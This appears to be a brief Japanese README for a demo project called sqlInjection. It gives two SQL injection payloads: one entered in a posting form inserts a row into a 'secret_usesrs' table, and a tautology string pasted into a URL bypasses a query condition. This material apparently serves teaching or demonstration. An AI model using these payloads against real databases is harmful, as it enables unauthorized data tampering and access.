# sqlInjection
# 使い方
# yarn installしてください
# 攻撃方法 1
# ','');insert into secret_usesrs (name, email) values ('injection', 'injection')--
# を書き込みのところに入力
# 攻撃方法 2
# hoge' AND email = 'name' OR 'x' = 'x';--
# をurlに貼り付け